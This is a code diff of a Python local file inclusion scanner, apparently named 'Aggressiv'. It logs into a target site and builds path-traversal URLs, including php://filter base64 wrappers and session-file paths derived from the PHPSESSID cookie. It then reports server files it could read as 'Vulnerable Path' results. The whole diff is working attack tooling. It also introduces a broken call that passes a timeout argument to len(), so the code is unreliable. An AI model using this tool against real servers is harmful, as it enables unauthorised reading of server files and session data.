@@ -62,7 +62,7 @@ class Aggressiv :
                                            ('username',f'{self.args.user}'.replace('\n','')),
                                            ('password',f'{self.args.password}'),
                                            ('Cookie',str(self.Cookie).replace('\n',''))]                     
-                      url_login = request.open(loginurl)    
+                      url_login = request.open(loginurl,timeout=5)    
                       try: 
                           request.select_form(nr = 0)
                       except Exception :
@@ -129,11 +129,15 @@ class Aggressiv :
                 command_dir = readline.readlines()
                 for LINE in command_dir :
                     LINE.replace('\n','')
-                    self.LFi = ''
+                   # self.LFi = ''
                     if self.args.base64:
-                        phpfillter = 'php://filter/read=convert.base64-encode/resource='
-                        URL = self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE
-                        
+                        if 'sess_' not in LINE :
+                            phpfillter = 'php://filter/read=convert.base64-encode/resource='
+                            URL = self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE
+                        else:
+                            URL = self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE.replace('\n','')+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie)))
+                    elif "sess_" in LINE: 
+                        URL = self.args.Vulnurl+LINE.replace('\n','')+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie))) 
                     else:
                          URL = self.args.Vulnurl+LINE
                                                                                       
@@ -148,7 +152,7 @@ class Aggressiv :
                                  ('username',f'{self.args.user}'),
                                  ('password',f'{self.args.password}')]
                     try:             
-                       first_req = request.open(self.args.Vulnurl).read()                                                      
+                       first_req = request.open(self.args.Vulnurl,timeout=5).read()                                                      
                        self.Get_Oregnal_URL = request.open(self.url).read()
                     except Exception  as e :
                          print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
@@ -160,7 +164,7 @@ class Aggressiv :
                          exit()     
                     except KeyboardInterrupt :
                          exit()        
-                    number = str(len(self.Get_Oregnal_URL))
+                    self.number = str(len(self.Get_Oregnal_URL,timeout=5))
                     try:  
                         filename = LINE.replace('../','').replace('%2f','').replace('....//','').replace('../','').replace('file://','').replace('//','/').replace('\n','')
                         if self.args.base64:
@@ -202,57 +206,45 @@ class Aggressiv :
                                     print(" "+"-"*149)                    
                                     num = 1 
                              try:       
-                                print("|  "+f"{  filename[0:20]     :<23}","| "+f"{    number    :<13}"+"| ",f"{   fullurl[0:100]   :<100}","    |",end='\n')   
+                                print("|  "+f"{  filename[0:20]     :<23}","| "+f"{    self.number   :<13}"+"| ",f"{   fullurl[0:100]   :<100}","    |",end='\n')   
 
                              except IndexError:
                                  continue                    
-                       self.box_list.append(number)
+                       self.box_list.append(self.number)
                        self.link_list.append(self.url.replace('\n',' '))
                        self.link_list.append (str(len(self.Get_Oregnal_URL)))
           except KeyboardInterrupt :
-             exit()                                             
+             pass                                            
         def Scan_result(self,**kwargs) :
-                 final_list = []
-                 remove_dup_elem = [*set(self.box_list)]
-                 it = iter(self.link_list)
-                 res_dct = dict(zip(it, it))
-                 res_dct  = res_dct
-                 for key in res_dct:
-                      with open('./Package/.list','a') as listf:
-                          listf.write("%s%s" % (key, res_dct[key])+'\n')  
-                 with open('./Package/.list','r') as readf:
-                      readFile = readf.readlines()
-                      for line in readFile :
-                          for i in remove_dup_elem:                             
-                             if i in line[-6:-1] :
-                                if i in  final_list :
-                                   pass
-                                else:
-                                    try:
-                                       final_list.remove(i)
-                                       final_list.remove("\\n")
-                                    except ValueError:
-                                      pass  
-                                    final_list.append(line)
-                                    final_list.append(i)
-                                    final_list.sort()
-                 for L in final_list:                    
-                      links = str("".join(re.findall(r'(https?://[^\s]+)',L)))                         
-                      with open('./Package/.links','a') as writefile:
-                               if links == '':
-                                  pass
-                               else:   
-                                   writedata = writefile.write('[+] '+links+'\n')
-                 with open('./Package/.links','r') as readfile:
-                      readdata = readfile.read()
-                      readdata =readdata.split("\n")
-                      readdata = str("\n".join(readdata))                 
-                 if  os.path.exists('./Package/.links'):
-                     os.remove('./Package/.links')
-                     os.remove('./Package/.list')     
-                 print('\n'+'='*40+"\n[*] Vulnerable Path "+'\n'+'='*30+'\n')   
-                 print(readdata)                                           
-          
+            final_list = []
+            unique_elements = set(self.box_list)
+            link_dict = dict(zip(self.link_list[::2], self.link_list[1::2]))
+            with open('./Package/.list', 'w') as listf:
+                for key, value in link_dict.items():
+                    listf.write(f"{key}{value}\n")
+            with open('./Package/.list', 'r') as readf:
+                read_lines = readf.readlines()
+                for line in read_lines:
+                    for element in unique_elements:
+                        if element in line[-6:-1] and element not in final_list:
+                            final_list.append(line.strip())
+                            final_list.append(element)
+            final_list.sort()
+            with open('./Package/.links', 'w') as writefile:
+                for entry in final_list:
+                    links = "".join(re.findall(r'(https?://[^\s]+)', entry))
+                    if links:
+                        writefile.write(f'[+] {links[0:-len(self.number)]}\n')
+            with open('./Package/.links', 'r') as readfile:
+                readdata = "\n".join(readfile.read().splitlines())
+            print('\n' + '=' * 40 + " \n[*] Vulnerable Path " + '\n' + '=' * 30 + '\n')
+            print(readdata)    
+            if os.path.exists('./Package/.links'):
+                os.remove('./Package/.links')
+            if os.path.exists('./Package/.list'):
+                os.remove('./Package/.list')
+           
+
 if __name__=='__main__':
      Aggressiv()                  
                  
